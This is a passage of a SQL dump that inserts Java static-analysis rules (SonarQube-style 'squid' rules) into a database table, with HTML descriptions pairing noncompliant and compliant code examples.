List&lt;String&gt; bookNames = new ArrayList&lt;&gt;();
books.stream().filter(book -&gt; book.getIsbn().startsWith("0"))
                .map(Book::getTitle)
                .forEach(bookNames::add);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; bookNames = books.stream().filter(book -&gt; book.getIsbn().startsWith("0"))
                .map(Book::getTitle)
                .collect(Collectors.toList());
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'java8', false, 'HTML', 1510817813149, 1510817813150, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1063, 'Optional value should only be accessed after calling isPresent()', 'S3655', NULL, 'squid', '<p><code>Optional</code> value can hold either a value or not. The value held in the <code>Optional</code> can be accessed using the
<code>get()</code> method, but it will throw a </p>
<p><code>NoSuchElementException</code> if there is no value present. To avoid the exception, calling the <code>isPresent()</code> method should always
be done before any call to <code>get()</code>.</p>
<p>Alternatively, note that other methods such as <code>orElse(...)</code>, <code>orElseGet(...)</code> or <code>orElseThrow(...)</code> can be used
to specify what to do with an empty <code>Optional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

String stringValue = value.get(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

if (value.isPresent()) {
  String stringValue = value.get();
}
</pre>
<p>or</p>
<pre>
Optional&lt;String&gt; value = this.getOptionalValue();

// ...

String stringValue = value.orElse("default");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe', false, 'HTML', 1510817813150, 1510817813151, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1064, 'Generic exceptions should never be thrown', 'S00112', 'S112', 'squid', '<p>Using such generic exceptions as <code>Error</code>, <code>RuntimeException</code>, <code>Throwable</code>, and <code>Exception</code> prevents
calling methods from handling true, system-generated exceptions differently than application-generated errors. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void foo(String bar) throws Throwable {  // Noncompliant
  throw new RuntimeException("My Message");     // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void foo(String bar) {
  throw new MyOwnRuntimeException("My Message");
}
</pre>
<h2>Exceptions</h2>
<p>Generic exceptions in the signatures of overriding methods are ignored, because overriding method has to follow signature of the throw declaration
in the superclass. The issue will be raised on superclass declaration of the method (or won''t be raised at all if superclass is not part of the
analysis).</p>
<pre>
@Override
public void myMethod() throws Exception {...}
</pre>
<p>Generic exceptions are also ignored in the signatures of methods that make calls to methods that throw generic exceptions.</p>
<pre>
public void myOtherMethod throws Exception {
  doTheThing();  // this method throws Exception
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/397.html">MITRE, CWE-397</a> - Declaration of Throws for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BoB3AQ">CERT, ERR07-J.</a> - Do not throw RuntimeException, Exception, or Throwable
  </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cert,cwe,error-handling', false, 'HTML', 1510817813151, 1510817813152, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1065, 'Synchronized classes Vector, Hashtable, Stack and StringBuffer should not be used', 'S1149', NULL, 'squid', '<p>Early classes of the Java API, such as <code>Vector</code>, <code>Hashtable</code> and <code>StringBuffer</code>, were synchronized to make them
thread-safe. Unfortunately, synchronization has a big negative impact on performance, even when using these collections from a single thread.</p>
<p>It is better to use their new unsynchronized replacements:</p>
<ul>
  <li> <code>ArrayList</code> or <code>LinkedList</code> instead of <code>Vector</code> </li>
  <li> <code>Deque</code> instead of <code>Stack</code> </li>
  <li> <code>HashMap</code> instead of <code>Hashtable</code> </li>
  <li> <code>StringBuilder</code> instead of <code>StringBuffer</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Vector cats = new Vector();
</pre>
<h2>Compliant Solution</h2>
<pre>
ArrayList cats = new ArrayList();
</pre>
<h2>Exceptions</h2>
<p>Use of those synchronized classes is ignored in the signatures of overriding methods.</p>
<pre>
@Override
public Vector getCats() {...}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'performance', false, 'HTML', 1510817813153, 1510817813153, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1081, 'Collections should not be passed as arguments to their own methods', 'S2114', NULL, 'squid', '<p>Passing a collection as an argument to the collection''s own method is either an error - some other argument was intended - or simply nonsensical
code. </p>
<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in
undefined behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();
objs.add("Hello");

objs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called
objs.addAll(objs); // Noncompliant; behavior undefined
objs.containsAll(objs); // Noncompliant; always true
objs.removeAll(objs); // Noncompliant; confusing. Use clear() instead
objs.retainAll(objs); // Noncompliant; NOOP
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817813171, 1510817813171, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1066, 'Non-serializable classes should not be written', 'S2118', NULL, 'squid', '<p>Nothing in a non-serializable class will be written out to file, and attempting to serialize such a class will result in an exception being thrown.
Only a class that <code>implements Serializable</code> or one that extends such a class can successfully be serialized (or de-serialized). </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Vegetable {  // neither implements Serializable nor extends a class that does
  //...
}

public class Menu {
  public void meal() throws IOException {
    Vegetable veg;
    //...
    FileOutputStream fout = new FileOutputStream(veg.getName());
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(veg);  // Noncompliant. Nothing will be written
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Vegetable implements Serializable {  // can now be serialized
  //...
}

public class Menu {
  public void meal() throws IOException {
    Vegetable veg;
    //...
    FileOutputStream fout = new FileOutputStream(veg.getName());
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(veg);
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'serialization', false, 'HTML', 1510817813153, 1510817813154, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1067, 'Methods should not have too many parameters', 'S00107', 'S107', 'squid', '<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, String param4, long param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, String param4) {
...
}
</pre>
<h2>Exceptions</h2>
<p>Methods annotated with Spring''s <code>@RequestMapping</code> may have a lot of parameters, encapsulation being possible. Such methods are therefore
ignored.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813155, 1510817813155, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1068, 'Try-catch blocks should not be nested', 'S1141', NULL, 'squid', '<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand
which block will catch which exception.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'confusing', false, 'HTML', 1510817813157, 1510817813157, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1069, 'Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression', 'S881', NULL, 'squid', '<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions. </li>
  <li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression. </li>
  <li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects
  other than that cause by the increment or decrement operator </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra', false, 'HTML', 1510817813157, 1510817813158, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1070, 'Invalid "Date" values should not be used', 'S2110', NULL, 'squid', '<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month
starts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12
for month, and you''ll get January of the following year.</p>
<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and
<code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>
<table>
  <tbody>
    <tr>
      <th>Field</th>
      <th>Valid</th>
    </tr>
    <tr>
      <td>month</td>
      <td>0-11</td>
    </tr>
    <tr>
      <td>date (day)</td>
      <td>0-31</td>
    </tr>
    <tr>
      <td>hour</td>
      <td>0-23</td>
    </tr>
    <tr>
      <td>minute</td>
      <td>0-60</td>
    </tr>
    <tr>
      <td>second</td>
      <td>0-61</td>
    </tr>
  </tbody>
</table>
<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Date d = new Date();
d.setDate(25);
d.setYear(2014);
d.setMonth(12);  // Noncompliant; rolls d into the next year

Calendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant
if (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Date d = new Date();
d.setDate(25);
d.setYear(2014);
d.setMonth(11);

Calendar c = new Gregorian Calendar(2014, 11, 25);
if (c.get(Calendar.MONTH) == 11) {
  // ...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813159, 1510817813159, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1071, 'Methods should not have too many return statements', 'S1142', NULL, 'squid', '<p>Having too many return statements in a method increases the method''s essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the method.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
public boolean myMethod() { // Noncompliant; there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813160, 1510817813160, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1072, 'Non-public methods should not be "@Transactional"', 'S2230', NULL, 'squid', '<p>Marking a non-public method <code>@Transactional</code> is both useless and misleading because Spring doesn''t "see" non-<code>public</code>
methods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it called.</p>
<p>Therefore marking a <code>private</code> method, for instance, <code>@Transactional</code> can only result in a runtime error or exception if the
method is actually written to be <code>@Transactional</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Transactional  // Noncompliant
private void doTheThing(ArgClass arg) {
  // ...
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'spring', false, 'HTML', 1510817813161, 1510817813162, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1073, 'Jump statements should not occur in "finally" blocks', 'S1143', NULL, 'squid', '<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any
unhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and
<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println("OK");   // incorrect "OK" message is printed
  } catch (RuntimeException e) {
    System.out.println("ERROR");  // this message is not shown
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
    return;      // Noncompliant - prevents the RuntimeException from being propagated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String[] args) {
  try {
    doSomethingWhichThrowsException();
    System.out.println("OK");
  } catch (RuntimeException e) {
    System.out.println("ERROR");  // "ERROR" is printed as expected
  }
}

public static void doSomethingWhichThrowsException() {
  try {
    throw new RuntimeException();
  } finally {
    for (int i = 0; i &lt; 10; i ++) {
      //...
      if (q == i) {
        break; // ignored
      }
    }

    /* ... */
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/584.html">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/mIEbAQ">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,cwe,error-handling', false, 'HTML', 1510817813162, 1510817813163, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1086, 'Files should not have too many lines of code', 'S00104', 'S104', 'squid', '<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817813175, 1510817813176, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1074, '"URL.hashCode" and "URL.equals" should be avoided', 'S2112', NULL, 'squid', '<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> both may trigger a name service (usually DNS) lookup to
resolve the host name or IP address. Depending on the configuration, and network status, that can take a long time. <code>URI</code> on the other hand
makes no such calls and should be used instead unless the specific <code>URL</code> functionality is required.</p>
<p>In general it is better to use the <code>URI</code> class until access to the resource is actually needed, at which point you can just convert the
<code>URI</code> to a <code>URL</code> using <code>URI.toURL()</code>.</p>
<p>This rule checks for uses of <code>URL</code> ''s in <code>Map</code> and <code>Set</code> , and for explicit calls to the <code>equals</code> and
<code>hashCode</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void checkUrl(URL url) {
  Set&lt;URL&gt; sites = new HashSet&lt;URL&gt;();  // Noncompliant

  URL homepage = new URL("http://sonarsource.com");  // Compliant
  if (homepage.equals(url)) { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void checkUrl(URL url) {
  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();  // Compliant

  URI homepage = new URI("http://sonarsource.com");  // Compliant
  URI uri = url.toURI();
  if (homepage.equals(uri)) {  // Compliant
    // ...
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'performance', false, 'HTML', 1510817813163, 1510817813164, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1075, 'A "while" loop should be used instead of a "for" loop', 'S1264', NULL, 'squid', '<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a
<code>while</code> loop should be used instead to increase readability. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (;condition;) { /*...*/ }
</pre>
<h2>Compliant Solution</h2>
<pre>
while (condition) { /*...*/ }
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817813164, 1510817813165, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1076, 'Nested blocks of code should not be left empty', 'S00108', 'S108', 'squid', '<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty unless it is a <code>synchronized</code> block. <code>synchronized</code>
blocks are still considered empty even with comments because they can still affect program flow.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817813165, 1510817813166, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1077, '"ResultSet.isLast()" should not be used', 'S2232', NULL, 'squid', '<p>There are several reasons to avoid <code>ResultSet.isLast()</code>. First, support for this method is optional for <code>TYPE_FORWARD_ONLY</code>
result sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question). Finally, the specification is not clear
on what should be returned when the <code>ResultSet</code> is empty, so some drivers may return the opposite of what is expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
stmt.executeQuery("SELECT name, address FROM PERSON");
ResultSet rs = stmt.getResultSet();
while (! rs.isLast()) { // Noncompliant
  // process row
}
</pre>
<h2>Compliant Solution</h2>
<pre>
ResultSet rs = stmt.executeQuery("SELECT name, address FROM PERSON");
while (! rs.next()) {
  // process row
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'performance,pitfall,sql', false, 'HTML', 1510817813166, 1510817813167, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1078, '"BigDecimal(double)" should not be used', 'S2111', NULL, 'squid', '<p>Because of floating point imprecision, you''re unlikely to get the value you expect from the <code>BigDecimal(double)</code> constructor. </p>
<p>From <a href="http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)">the JavaDocs</a>:</p>
<blockquote>
  The results of this constructor can be somewhat unpredictable. One might assume that writing new BigDecimal(0.1) in Java creates a BigDecimal which
  is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to
  0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a
  binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not exactly equal to 0.1, appearances
  notwithstanding.
</blockquote>
<p>Instead, you should use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors, or the
constructor that takes a <code>String</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
double d = 1.1;

BigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above
BigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result
</pre>
<h2>Compliant Solution</h2>
<pre>
double d = 1.1;

BigDecimal bd1 = BigDecimal.valueOf(d);
BigDecimal bd2 = new BigDecimal("1.1"); // using String constructor will result in precise value
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NQAVAg">CERT, NUM10-J.</a> - Do not construct BigDecimal objects from floating-point
  literals </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817813167, 1510817813168, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1079, 'Lines should not be too long', 'S00103', 'S103', 'squid', '<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813168, 1510817813169, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1080, 'Useless "if(true) {...}" and "if(false){...}" blocks should be removed', 'S1145', NULL, 'squid', '<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {
  doSomething();
}
...
if (false) {
  doSomethingElse();
}

if (2 &lt; 3 ) { ... }  // Noncompliant; always false

int i = 0;
int j = 0;
// ...
j = foo();

if (j &gt; 0 &amp;&amp; i &gt; 0) { ... }  // Noncompliant; always false - i never set after initialization

boolean b = true;
//...
if (b || !b) { ... }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:squid:S2583} instead.</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cwe,misra', false, 'HTML', 1510817813170, 1510817813170, 2);
